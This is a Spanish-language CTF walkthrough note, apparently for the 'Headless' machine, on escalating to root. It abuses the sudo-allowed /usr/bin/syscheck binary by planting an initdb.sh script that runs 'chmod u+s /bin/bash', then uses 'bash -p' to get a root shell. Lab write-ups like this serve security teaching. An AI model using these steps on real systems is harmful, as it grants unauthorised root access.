#abusobinariosyscheck

-------

![[Headless14.png]]
Sabemos que podemos ejecutar el binario */usr/bin/syscheck* como root sin proporcionar contraseña

Buscando en google sobre este binario y como escalar privilegios, encontramos este [post](https://medium.com/@adiamond186/usr-bin-syscheck-is-looking-for-the-initdb-sh-609cd006d913)
Y vemos que al ejecutarse el binario, necesita ejecutar el archivo *initdb.sh* asi que vamos a cambiar el PATH para cuando busque este archivo y modificar el contenido del mismo. Para esto vamos a usar la tecnica [[Path Hijacking]], usando el comando [[echo]] y [[export]]

Vamos a usar `echo $PATH` para ver nuestro PATH actual, luego lo vamos a modificar para que de primeras cuando ejecutamos un binario busque en el directorio */tmp* `export PATH= /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
![[Headless16.png]]

Ahora vamos a la carpeta *tmp* con [[cd]] usando el comando `cd /tmp`

Vamos a crear el archivo initdb.sh con [[nano]] usando el comando `nano initdb.sh` y le vamos a dar permiso de ejecucion con [[chmod]] usando le comando `chmod +x initdb.sh` 

Contenido del archivo *initdb.sh*

```sh
chmod u+s /bin/bash
```
Esto lo que va a hacer es que cuando ejecutemos el binario se va a transformar el [[SUID]] la [[bash]]

Una vez hecho esto vamos a ejecutar con [[sudo]] usando `sudo /usr/bin/syscheck` para que tenga permisos de root, y haga la bash [[SUID]] como dijimos antes. Ahora con [[ls]] usamos `ls -la /bin/bash` y vemos que aparece la *s* asi que se transformo en [[SUID]] y solo nos queda ejecutar la [[bash]] con permisos de admin que para eso usamos el comando `bash -p`
Y listo ya somos root nada mas nos queda catear las flags
![[Headless15.png]]